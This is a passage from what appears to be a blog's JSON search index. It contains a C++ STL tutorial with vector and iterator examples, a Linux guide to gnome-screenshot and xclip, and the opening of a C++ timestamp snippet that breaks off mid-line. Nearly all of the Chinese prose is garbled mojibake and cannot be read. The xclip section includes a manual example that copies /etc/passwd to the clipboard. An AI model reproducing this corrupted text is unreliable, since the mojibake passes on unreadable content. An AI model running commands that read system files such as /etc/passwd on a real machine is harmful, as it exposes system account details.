æ¥å£è€…ï¼Œç§°ä¸º Iterator Adapterã€‚é€‚é…å™¨çš„å®ç°æŠ€æœ¯å¾ˆéš¾ä¸€è¨€è”½ä¹‹ï¼Œå¿…é¡»é€ä¸€åˆ†æã€‚ ç©ºé—´é…ç½®å™¨ï¼ˆAllocatorsï¼‰ï¼šè´Ÿè´£ç©ºé—´é…ç½®ä¸ç®¡ç†ï¼Œä»å®ç°çš„è§’åº¦æ¥çœ‹ï¼Œé…ç½®å™¨æ˜¯ä¸€ä¸ªå®ç°äº†åŠ¨æ€ç©ºé—´é…ç½®ã€ç©ºé—´ç®¡ç†ã€ç©ºé—´é‡Šæ”¾çš„ç±»æ¨¡æ¿ã€‚ å®¹å™¨çš„åŸºæœ¬æ¦‚å¿µåœ¨å®é™…çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæ•°æ®ç»“æ„æœ¬èº«çš„é‡è¦æ€§ä¸ä¼šé€Šäºæ“ä½œæ•°æ®ç»“æ„çš„ç®—æ³•çš„é‡è¦æ€§ï¼Œå½“ç¨‹åºä¸­å­˜åœ¨ç€å¯¹æ‰§è¡Œæ•ˆç‡è¦æ±‚å¾ˆé«˜çš„éƒ¨åˆ†æ—¶ï¼Œæ•°æ®ç»“æ„çš„é€‰æ‹©å°±æ˜¾å¾—æ›´åŠ é‡è¦ã€‚ç»å…¸çš„æ•°æ®ç»“æ„æ•°é‡æœ‰é™ï¼Œä½†æ˜¯å¸¸å¸¸é‡å¤ç€ä¸€äº›ä¸ºäº†å®ç°å‘é‡ã€é“¾è¡¨ç­‰ç»“æ„è€Œç¼–å†™çš„ä»£ç ï¼Œè¿™äº›ä»£ç éƒ½ååˆ†ç›¸ä¼¼ï¼Œåªæ˜¯ä¸ºäº†é€‚åº”ä¸åŒæ•°æ®çš„å˜åŒ–è€Œåœ¨ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒã€‚STL å®¹å™¨ä¸ºæ­¤æä¾›äº†è¿™æ ·çš„æ–¹ä¾¿ï¼Œå®ƒå…è®¸é‡å¤åˆ©ç”¨å·²æœ‰çš„å®ç°æ„é€ è‡ªå·±çš„ç‰¹å®šç±»å‹ä¸‹çš„æ•°æ®ç»“æ„ï¼Œé€šè¿‡è®¾ç½®ä¸€äº›æ¨¡æ¿ï¼ŒSTL å®¹å™¨å¯¹æœ€å¸¸ç”¨çš„æ•°æ®ç»“æ„æä¾›äº†æ”¯æŒï¼Œè¿™äº›æ¨¡æ¿çš„å‚æ•°å…è®¸æŒ‡å®šå®¹å™¨ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥å°†è®¸å¤šé‡å¤è€Œä¹å‘³çš„å·¥ä½œç®€åŒ–ã€‚å®¹å™¨éƒ¨åˆ†ä¸»è¦ç”±å¤´æ–‡ä»¶ &lt;vector&gt;ã€&lt;list&gt;ã€&lt;deque&gt;ã€&lt;set&gt;ã€&lt;map&gt;ã€&lt;stack&gt;ã€&lt;queue&gt; ç»„æˆã€‚å¯¹äºå¸¸ç”¨çš„ä¸€äº›å®¹å™¨å’Œå®¹å™¨é€‚é…å™¨ï¼ˆå¯ä»¥çœ‹ä½œç”±å…¶å®ƒå®¹å™¨å®ç°çš„å®¹å™¨ï¼‰ï¼Œå¯ä»¥é€šè¿‡ä¸‹è¡¨æ€»ç»“ä¸åŒå®¹å™¨ä¸ç›¸åº”å¤´æ–‡ä»¶çš„å¯¹åº”å…³ç³»ã€‚ å®¹å™¨ æè¿° å®ç°å¤´æ–‡ä»¶ å‘é‡ (vector) è¿ç»­å†…å­˜çš„å…ƒç´  &lt;vector&gt; åˆ—è¡¨ (list) ç”±èŠ‚ç‚¹ç»„æˆçš„åŒå‘é“¾è¡¨ï¼Œæ¯ä¸ªç»“ç‚¹åŒ…å«ç€ä¸€ä¸ªå…ƒç´  &lt;list&gt; åŒé˜Ÿåˆ— (deque) è¿ç»­å†…å­˜çš„æŒ‡å‘ä¸åŒå…ƒç´ çš„æŒ‡é’ˆæ‰€ç»„æˆçš„æ•°ç»„ &lt;deque&gt; é›†åˆ (set) ç”±èŠ‚ç‚¹ç»„æˆçš„çº¢é»‘æ ‘ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å«ç€ä¸€ä¸ªå…ƒç´ ï¼ŒèŠ‚ç‚¹ä¹‹é—´ä»¥æŸç§ä½œç”¨äºå…ƒç´ å¯¹çš„è°“è¯æ’åˆ—ï¼Œæ²¡æœ‰ä¸¤ä¸ªä¸åŒçš„å…ƒç´ èƒ½å¤Ÿæ‹¥æœ‰ç›¸åŒçš„æ¬¡åº &lt;set&gt; å¤šé‡é›†åˆ (multiset) å…è®¸å­˜åœ¨ä¸¤ä¸ªæ¬¡åºç›¸ç­‰çš„å…ƒç´ çš„é›†åˆ &lt;set&gt; æ ˆ (stack) å…ˆè¿›åå‡ºçš„å€¼çš„æ’åˆ— &lt;stack&gt; é˜Ÿåˆ— (queue) å…ˆè¿›å…ˆå‡ºçš„æ‰§çš„æ’åˆ— &lt;queue&gt; ä¼˜å…ˆé˜Ÿåˆ— (priority_queue) å…ƒç´ çš„æ¬¡åºæ˜¯ç”±ä½œç”¨äºæ‰€å†…å­˜çš„å€¼å¯¹ä¸Šçš„æŸç§è°“è¯å†³å®šçš„ä¸€ç§é˜Ÿåˆ— &lt;queue&gt; æ˜ å°„ (map) ç”± {é”®ï¼Œå€¼} å¯¹ç»„æˆçš„é›†åˆï¼Œä»¥æŸç§ä½œç”¨äºé”®å¯¹ä¸Šçš„è°“è¯æ’åˆ— &lt;map&gt; å¤šé‡æ˜ å°„ (multimap) å…è®¸é”®å¯¹æœ‰ç›¸ç­‰çš„æ¬¡åºçš„æ˜ å°„ &lt;map&gt; å®¹å™¨çš„ç®€ä»‹å®¹å™¨å¯ä»¥ç”¨æ¥ç®¡ç†ä¸€ç»„å…ƒç´ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å®¹å™¨çš„åˆ†ç±» åºåˆ—å¼å®¹å™¨ï¼ˆSequence Containersï¼‰ï¼šæ¯ä¸ªå…ƒç´ éƒ½æœ‰å›ºå®šçš„ä½ç½®ï¼Œå–å†³äºæ’å…¥æ—¶æœºå’Œåœ°ç‚¹ï¼Œä¸å…ƒç´ çš„å€¼æ— å…³ï¼Œå¦‚ vectorã€dequeã€list å…³è”å¼å®¹å™¨ï¼ˆAssociated Containersï¼‰ï¼šå…ƒç´ ä½ç½®å–å†³äºç‰¹å®šçš„æ’åºè§„åˆ™ï¼Œä¸æ’å…¥çš„é¡ºåºæ— å…³ï¼Œå¦‚ setã€multisetã€mapã€multimap ç®—æ³•çš„åŸºæœ¬æ¦‚å¿µç®—æ³•çš„ç®€ä»‹å‡½æ•°åº“å¯¹æ•°æ®ç±»å‹çš„é€‰æ‹©å¯¹å…¶å¯é‡ç”¨æ€§èµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä¸€ä¸ªæ±‚æ–¹æ ¹çš„å‡½æ•°ï¼Œåœ¨ä½¿ç”¨æµ®ç‚¹æ•°ä½œä¸ºå…¶å‚æ•°ç±»å‹çš„æƒ…å†µä¸‹çš„å¯é‡ç”¨æ€§è‚¯å®šæ¯”ä½¿ç”¨æ•´å‹ä½œä¸ºå®ƒçš„å‚æ•°ç±»æ€§è¦é«˜ã€‚è€Œ C++ é€šè¿‡æ¨¡æ¿çš„æœºåˆ¶å…è®¸æ¨è¿Ÿå¯¹æŸäº›ç±»å‹çš„é€‰æ‹©ï¼Œç›´åˆ°çœŸæ­£æƒ³ä½¿ç”¨æ¨¡æ¿æˆ–è€…è¯´å¯¹æ¨¡æ¿è¿›è¡Œç‰¹åŒ–çš„æ—¶å€™ï¼ŒSTL å°±åˆ©ç”¨äº†è¿™ä¸€ç‚¹æä¾›äº†ç›¸å½“å¤šçš„ç®—æ³•ã€‚å®ƒæ˜¯åœ¨ä¸€ä¸ªæœ‰æ•ˆçš„æ¡†æ¶ä¸­å®Œæˆè¿™äº›ç®—æ³•çš„ â€”â€” å¯ä»¥å°†æ‰€æœ‰çš„ç±»å‹åˆ’åˆ†ä¸ºå°‘æ•°çš„å‡ ç±»ï¼Œç„¶åå°±å¯ä»¥åœ¨æ¨¡æ¿çš„å‚æ•°ä¸­ä½¿ç”¨ä¸€ç§ç±»å‹æ›¿æ¢æ‰åŒä¸€ç§ç±»ä¸­çš„å…¶ä»–ç±»å‹ã€‚ ç®—æ³•çš„å¤´æ–‡ä»¶STL æä¾›äº†å¤§çº¦ 100 ä¸ªå®ç°ç®—æ³•çš„å‡½æ•°æ¨¡æ¿ï¼Œæ¯”å¦‚ç®—æ³• for_each å°†ä¸ºæŒ‡å®šåºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è°ƒç”¨æŒ‡å®šçš„å‡½æ•°ï¼Œstable_sort ä»¥è°ƒç”¨è€…æ‰€æŒ‡å®šçš„è§„åˆ™å¯¹åºåˆ—è¿›è¡Œç¨³å®šæ€§æ’åºç­‰ç­‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œåªè¦ç†Ÿæ‚‰äº† STL ä¹‹åï¼Œè®¸å¤šä»£ç å¯ä»¥è¢«å¤§å¤§åœ°ç®€åŒ–ï¼Œåªéœ€è¦é€šè¿‡è°ƒç”¨ä¸€ä¸¤ä¸ªç®—æ³•æ¨¡æ¿ï¼Œå°±å¯ä»¥å®Œæˆæ‰€éœ€è¦çš„åŠŸèƒ½ã€‚ç®—æ³•ä¸»è¦ç”±å¤´æ–‡ä»¶ &lt;algorithm&gt;ã€&lt;numeric&gt;ã€&lt;functional&gt; ç»„æˆã€‚&lt;algorithm&gt; æ˜¯æ‰€æœ‰ STL å¤´æ–‡ä»¶ä¸­æœ€å¤§çš„ä¸€ä¸ªï¼Œå®ƒæ˜¯ç”±ä¸€å¤§å †å‡½æ•°æ¨¡æ¿ç»„æˆçš„ï¼Œå¯ä»¥è®¤ä¸ºæ¯ä¸ªå‡½æ•°åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå…¶ä¸­å¸¸ç”¨åˆ°çš„åŠŸèƒ½èŒƒå›´æ¶‰åŠåˆ°æ¯”è¾ƒã€äº¤æ¢ã€æŸ¥æ‰¾ã€éå†ã€å¤åˆ¶ã€ä¿®æ”¹ã€ç§»é™¤ã€åè½¬ã€æ’åºã€åˆå¹¶æ“ä½œç­‰ã€‚&lt;numeric&gt; çš„ä½“ç§¯å¾ˆå°ï¼ŒåªåŒ…æ‹¬å‡ ä¸ªåœ¨åºåˆ—ä¸Šé¢è¿›è¡Œç®€å•æ•°å­¦è¿ç®—çš„å‡½æ•°æ¨¡æ¿ï¼ŒåŒ…æ‹¬åŠ æ³•å’Œä¹˜æ³•åœ¨åºåˆ—ä¸Šçš„ä¸€äº›æ“ä½œã€‚&lt;functional&gt; ä¸­åˆ™å®šä¹‰äº†ä¸€äº›ç±»æ¨¡æ¿ï¼Œç”¨æ¥å£°æ˜å‡½æ•°å¯¹è±¡ã€‚ è¿­ä»£å™¨çš„åŸºæœ¬æ¦‚å¿µè¿­ä»£å™¨ä»ä½œç”¨ä¸Šæ¥è¯´æ˜¯æœ€åŸºæœ¬çš„éƒ¨åˆ†ã€‚è½¯ä»¶è®¾è®¡æœ‰ä¸€ä¸ªåŸºæœ¬åŸåˆ™ï¼Œæ‰€æœ‰çš„é—®é¢˜éƒ½å¯ä»¥é€šè¿‡å¼•è¿›ä¸€ä¸ªé—´æ¥å±‚æ¥ç®€åŒ–ï¼Œè¿™ç§ç®€åŒ–åœ¨ STL ä¸­å°±æ˜¯ç”¨è¿­ä»£å™¨æ¥å®Œæˆçš„ã€‚æ¦‚æ‹¬æ¥è¯´ï¼Œè¿­ä»£å™¨åœ¨ STL ä¸­ç”¨æ¥å°†ç®—æ³•å’Œå®¹å™¨è”ç³»èµ·æ¥ï¼Œèµ·ç€ä¸€ç§é»å’Œå‰‚çš„ä½œç”¨ã€‚å‡ ä¹ STL æä¾›çš„æ‰€æœ‰ç®—æ³•éƒ½æ˜¯é€šè¿‡è¿­ä»£å™¨å­˜å–å…ƒç´ åºåˆ—è¿›è¡Œå·¥ä½œçš„ï¼Œæ¯ä¸€ä¸ªå®¹å™¨éƒ½å®šä¹‰äº†å…¶æœ¬èº«æ‰€ä¸“æœ‰çš„è¿­ä»£å™¨ï¼Œç”¨ä»¥å­˜å–å®¹å™¨ä¸­çš„å…ƒç´ ã€‚è¿­ä»£å™¨ä¸»è¦ç”±å¤´æ–‡ä»¶ &lt;utility&gt;ã€&lt;iterator&gt;ã€&lt;memory&gt; ç»„æˆã€‚å…¶ä¸­ &lt;utility&gt; æ˜¯ä¸€ä¸ªå¾ˆå°çš„å¤´æ–‡ä»¶ï¼Œå®ƒåŒ…æ‹¬äº†è´¯ç©¿ä½¿ç”¨åœ¨ STL ä¸­çš„å‡ ä¸ªæ¨¡æ¿çš„å£°æ˜ï¼Œ&lt;iterator&gt; ä¸­æä¾›äº†è¿­ä»£å™¨ ä½¿ç”¨çš„è®¸å¤šæ–¹æ³•ï¼Œè€Œå¯¹äº &lt;memory&gt; æè¿°èµ·æ¥åˆ™ååˆ†çš„å›°éš¾ï¼Œå®ƒä»¥ä¸åŒå¯»å¸¸çš„æ–¹å¼ä¸ºå®¹å™¨ä¸­çš„å…ƒç´ åˆ†é…å†…å­˜ç©ºé—´ï¼ŒåŒæ—¶ä¹Ÿä¸ºæŸäº›ç®—æ³•åœ¨æ‰§è¡ŒæœŸé—´äº§ç”Ÿçš„ä¸´æ—¶å¯¹è±¡æä¾›ç®¡ç†æœºåˆ¶ï¼Œ&lt;memory&gt; ä¸­æœ€ä¸»è¦çš„æ˜¯ç±»æ¨¡æ¿ allocatorï¼Œå®ƒè´Ÿè´£äº§ç”Ÿæ‰€æœ‰å®¹å™¨çš„é»˜è®¤ç©ºé—´é…ç½®å™¨ï¼ˆåˆ†é…å™¨ï¼‰ã€‚ åˆè¯†å®¹å™¨çš„ä½¿ç”¨æŒ‡é’ˆæ˜¯ä¸€ç§è¿­ä»£å™¨1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { int array[5] = {1, 2, 3, 4, 5}; int length = sizeof(array) / sizeof(int); int *p = array; for (int i = 0; i &lt; length; i++) { cout &lt;&lt; *(p++) &lt;&lt; " "; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 11 2 3 4 5 å®¹å™¨å­˜æ”¾åŸºç¡€æ•°æ®ç±»å‹12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;void m_print(const int num) { cout &lt;&lt; num &lt;&lt; " ";}int main() { // å®šä¹‰å®¹å™¨ vector&lt;int&gt; v; // æ’å…¥æ•°æ® v.push_back(11); v.push_back(12); v.push_back(13); v.push_back(14); v.push_back(15); // ç¬¬ä¸€ç§æ–¹å¼ï¼šéå†å®¹å™¨ vector&lt;int&gt;::iterator itBegin = v.begin(); vector&lt;int&gt;::iterator itEnd = v.end(); while (itBegin != itEnd) { cout &lt;&lt; *(itBegin++) &lt;&lt; " "; } cout &lt;&lt; endl; // ç¬¬äºŒç§æ–¹å¼ï¼šéå†å®¹å™¨ for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // ç¬¬ä¸‰ç§æ–¹å¼ï¼šéå†å®¹å™¨ for_each(v.begin(), v.end(), m_print); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12311 12 13 14 15 11 12 13 14 15 11 12 13 14 15 å®¹å™¨å­˜æ”¾è‡ªå®šä¹‰æ•°æ®ç±»å‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { Person p1(23, "Jim"); Person p2(26, "Tom"); Person p3(29, "Peter"); // å®šä¹‰å®¹å™¨ vector&lt;Person&gt; v; // æ’å…¥æ•°æ® v.push_back(p1); v.push_back(p2); v.push_back(p3); // éå†å®¹å™¨ for (vector&lt;Person&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; it-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; it-&gt;getName() &lt;&lt; endl; // æˆ–è€… // cout &lt;&lt; "age = " &lt;&lt; (*it).getAge() &lt;&lt; ", name = " &lt;&lt; (*it).getName() &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter å®¹å™¨å­˜æ”¾è‡ªå®šä¹‰æ•°æ®ç±»å‹çš„æŒ‡é’ˆ1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { // å®šä¹‰å®¹å™¨ vector&lt;Person *&gt; v; // æ’å…¥æ•°æ® v.push_back(new Person(23, "Jim")); v.push_back(new Person(26, "Tom")); v.push_back(new Person(29, "Peter")); // éå†å®¹å™¨ for (vector&lt;Person *&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; (*it)-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; (*it)-&gt;getName() &lt;&lt; endl; // æˆ–è€… // cout &lt;&lt; "age = " &lt;&lt; (**it).getAge() &lt;&lt; ", name = " &lt;&lt; (**it).getName() &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter å®¹å™¨ä¹‹é—´çš„åµŒå¥—ä½¿ç”¨12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { // å®šä¹‰å®¹å™¨ vector&lt;int&gt; v1; vector&lt;int&gt; v2; vector&lt;int&gt; v3; vector&lt;vector&lt;int&gt;&gt; v; // æ’å…¥æ•°æ® for (int i = 0; i &lt; 5; i++) { v1.push_back(i + 1); v2.push_back(i + 6); v3.push_back(i + 11); } v.push_back(v1); v.push_back(v2); v.push_back(v3); // éå†å®¹å™¨ for (vector&lt;vector&lt;int&gt;&gt;::iterator it1 = v.begin(); it1 != v.end(); it1++) { for (vector&lt;int&gt;::iterator it2 = (*it1).begin(); it2 != (*it1).end(); it2++) { cout &lt;&lt; *it2 &lt;&lt; " "; } cout &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1231 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Linux å±å¹•æˆªå›¾å’Œå‰ªè´´æ¿å‘½ä»¤è¡Œå·¥å…·",url:"/posts/9eb6789a.html",text:'å‰è¨€ç‰ˆæœ¬è¯´æ˜ xclipï¼š0.13 gnome-screenshotï¼š3.26.0 æˆªå›¾å·¥å…·gnome-screenshot æ˜¯ä¸€æ¬¾ GNOME å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒæ˜¯ä¸€æ¬¾ç”¨æ¥å¯¹æ•´ä¸ªå±å¹•ã€ä¸€ä¸ªç‰¹å®šçš„çª—å£æˆ–è€…ç”¨æˆ·æ‰€å®šä¹‰ä¸€äº›å…¶ä»–åŒºåŸŸè¿›è¡Œæ•è·çš„å·¥å…·ã€‚è¯¥å·¥å…·æä¾›äº†å‡ ä¸ªå…¶ä»–çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬å¯¹æ‰€æ•è·çš„æˆªå›¾çš„è¾¹ç•Œè¿›è¡Œç¾åŒ–çš„åŠŸèƒ½ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œgnome-screenshot ä¸é€‚ç”¨äº KDEã€Xfce ç­‰ Linux æ¡Œé¢ç¯å¢ƒã€‚ æˆªå›¾å·¥å…·çš„ä½¿ç”¨1234567891011121314# æ•æ‰æ•´ä¸ªå±å¹•$ gnome-screenshot# æ•æ‰å½“å‰Shellçª—å£$ gnome-screenshot -w# æ•æ‰æŒ‡å®šåŒºåŸŸ$ gnome-screenshot -a# å»¶è¿Ÿæ•æ‰å±å¹•$ gnome-screenshot -d 5# æ•æ‰å½“å‰Shellçª—å£ï¼Œå¹¶å»é™¤çª—å£çš„è¾¹æ¡†$ gnome-screenshot -w -b 12345# åŒºåŸŸæˆªå›¾ï¼Œå¹¶å°†æˆªå›¾å¤åˆ¶åˆ°å‰ªè´´æ¿$ gnome-screenshot -acbp# åŒºåŸŸæˆªå›¾ï¼Œå¹¶å°†æˆªå›¾è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶$ gnome-screenshot -abpf screenshot.png æˆªå›¾å·¥å…·çš„å‚æ•°è¯´æ˜123456789101112-c, --clipboard å°†æˆªå›¾ç›´æ¥å‘é€åˆ°å‰ªè´´æ¿-w, --window æˆªå–çª—å£ï¼Œè€Œä¸æ˜¯æ•´ä¸ªå±å¹•-a, --area æˆªå–å±å¹•çš„ä¸€ä¸ªåŒºåŸŸï¼Œè€Œä¸æ˜¯æ•´ä¸ªå±å¹•-b, --include-border åœ¨æˆªå›¾ä¸­åŒ…å«çª—å£è¾¹æ¡†-B, --remove-border å»é™¤å±å¹•æˆªå›¾çš„çª—å£è¾¹æ¡†-p, --include-pointer åœ¨æˆªå›¾ä¸­åŒ…å«é¼ æ ‡æŒ‡é’ˆ-d, --delay=ç§’ åœ¨æŒ‡å®šå»¶è¿Ÿåæˆªå›¾[ä»¥ç§’è®¡]-e, --border-effect=ç‰¹æ•ˆ æ·»åŠ åˆ°è¾¹æ¡†çš„ç‰¹æ•ˆï¼ˆé˜´å½±ã€è¾¹æ¡†ã€è€ç…§ç‰‡æˆ–æ— ç‰¹æ•ˆï¼‰-i, --interactive äº¤äº’è®¾ç½®é€‰é¡¹-f, --file=æ–‡ä»¶å å°†æˆªå›¾ç›´æ¥ä¿å­˜ä¸ºè¯¥æ–‡ä»¶--version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º--display=æ˜¾ç¤º è¦ä½¿ç”¨çš„ X æ˜¾ç¤º xclip çš„å®‰è£…åŠŸèƒ½è¯´æ˜xclip æ˜¯ä¸€ä¸ªå‰ªè´´æ¿çš„å‘½ä»¤è¡Œå®ç”¨å·¥å…·ï¼Œå®ƒå¯ä»¥ä»æ ‡å‡†æ–‡ä»¶æˆ–æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼ˆæ–‡æœ¬ã€å›¾ç‰‡ï¼‰å¹¶å°†å…¶æ”¾ç½®åœ¨å‰ªè´´æ¿é‡Œï¼Œä¹Ÿå¯ä»¥å°†å‰ªè´´æ¿é‡Œçš„æ•°æ®ï¼ˆæ–‡æœ¬ã€å›¾ç‰‡ï¼‰è¾“å‡ºåˆ°æ ‡å‡†æ–‡ä»¶æˆ–æ–‡ä»¶ä¸­ã€‚xclip è¯¦ç»†çš„åŠŸèƒ½è¯´æ˜å¦‚ä¸‹ï¼Œé€‚ç”¨äº Debian/Ubuntu/CentOS/Arch ç­‰ä¸»æµçš„ Linux å‘è¡Œç‰ˆã€‚ Accesses the cut-buffers Prints contents of selection to standard out Waits for selection requests in the background Supports the INCR mechanism for large transfers Reads data piped to standard in or files given as arguments Accesses the XA_PRIMARY, XA_SECONDARY or XA_CLIPBOARD selection Connects to the X display in $DISPLAY, or specified with -display host:0 ä¾èµ–å®‰è£…CentOS/Fedora 1# yum install -y libXmu libXmu-devel Debian/Ubuntu 1# apt-get install -y libx11-dev libxmu-headers libxt-dev libxmu-dev ç¼–è¯‘å®‰è£…12345678910111213141516# å…‹éš†ä»£ç # git clone https://github.com/astrand/xclip.git# è¿›å…¥æºç ç›®å½•# cd xclip# é¢„é…ç½®# autoreconf# ./configure# ç¼–è¯‘# make# å®‰è£…# make install# make install.man éªŒè¯å®‰è£…12345678# æŸ¥çœ‹ç‰ˆæœ¬å·$ xclip -versionxclip version 0.13Copyright (C) 2001-2008 Kim Saunders et al.Distributed under the terms of the GNU GPL# æŸ¥çœ‹å‘½ä»¤æ‰‹å†Œ$ man xclip xclip çš„ä½¿ç”¨ç¤ºä¾‹å›¾ç‰‡çš„ä½¿ç”¨ç¤ºä¾‹ å°†å›¾ç‰‡å¤åˆ¶åˆ°å‰ªè´´æ¿ 12345# ç¬¬ä¸€æ­¥ï¼šåŒºåŸŸæˆªå›¾ï¼Œå°†æˆªå›¾è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶$ gnome-screenshot -abpf screenshot.png# ç¬¬äºŒæ­¥ï¼šå°†æŒ‡å®šçš„å›¾ç‰‡å¤åˆ¶åˆ°å‰ªè´´æ¿$ xclip -selection clipboard -t image/png -i screenshot.png å°†å‰ªè´´æ¿çš„å›¾ç‰‡è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ 12345# ç¬¬ä¸€æ­¥ï¼šåŒºåŸŸæˆªå›¾ï¼Œå¹¶å°†æˆªå›¾å¤åˆ¶åˆ°å‰ªè´´æ¿$ gnome-screenshot -acbp# ç¬¬äºŒæ­¥ï¼šå°†å‰ªè´´æ¿çš„å›¾ç‰‡è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶$ xclip -selection clipboard -t image/png -o &gt; clipboard.png å®Œæ•´çš„ä½¿ç”¨ç¤ºä¾‹12345678910111213141516171819## Copy your uptime into the selection for pasting:$ uptime | xclip## Copy your password file for pasting:$ xclip /etc/passwd## Save some text you have Edit | Copied in a web browser:$ xclip -o -sel clip &gt; webpage.txt## Open a URL selected in an email client$ mozilla `xclip -o`## Copy XA_PRIMARY to XA_CLIPBOARD$ xclip -o | xclip -sel clip## In command mode in vim, select some lines of text, then press shift-:## for an ex prompt, and use this command to copy the selected lines of## text to the primary X selection:$ !xclip -f å€¼å¾—ä¸€æçš„æ˜¯ï¼Œxclip è‡ªèº«è¿˜æä¾›äº† xclip-copyfileã€xclip-pastefileã€xclip-cutfile å‘½ä»¤è¡Œå·¥å…·ï¼Œæ”¯æŒåœ¨ä¸åŒçš„ç›®å½•å’Œæœºå™¨ä¹‹é—´æ‹·è´å’Œç§»åŠ¨æ–‡ä»¶ï¼Œè¯¦è§ï¼šå®˜æ–¹æ–‡æ¡£ VS Code ä½¿ç”¨è¯´æ˜åœ¨ Linux ç³»ç»Ÿä¸‹ï¼ŒVS Code çš„ MarkDown ç²˜è´´æ’ä»¶ï¼Œä¾‹å¦‚ Markdown Paste åº•å±‚ä½¿ç”¨äº† xclipï¼Œä¸”ç‰ˆæœ¬å¿…é¡»å¤§äºç­‰äº 0.13.0ï¼Œå¦åˆ™è¿™ç±»æ’ä»¶æ— æ³•æ­£å¸¸å°†å‰ªè´´æ¿é‡Œçš„å›¾ç‰‡ç²˜è´´åˆ° MarkDown æ–‡ä»¶é‡Œã€‚ å‚è€ƒèµ„æ–™ Copy image from clipboard to file GNOME Screenshot canâ€™t copy to clipboard in Ubuntu 18.04 How to copy image to clipboard, to paste to another application How to copy an image to the clipboard from a file using command line var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"C++ å¼€å‘å¸¸ç”¨ä»£ç å—ä¹‹ä¸€",url:"/posts/b84a96ac.html",text:'æ—¥æœŸå¤„ç†è·å–æ—¶é—´æˆ³1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;chrono&gt;using namespace std;// è·å–æ—¶é—´æˆ³ï¼ˆç§’æ•°ï¼‰// dateTime: æ—¥æœŸæ—¶é—´å­—ç¬¦ä¸²ï¼Œæ ¼å¼ï¼š2021-01-08 21:27:00long getTimestamp(const string &amp;dateTime) { tm tm = {}; strptime(dateTime.c_str(), "%Y-%m-%d %H:%M:%S", &amp;tm); chrono::system_clock::time_point tp = chrono::system_clock::from_time_t(mktime(&amp;tm)); long milliseconds = 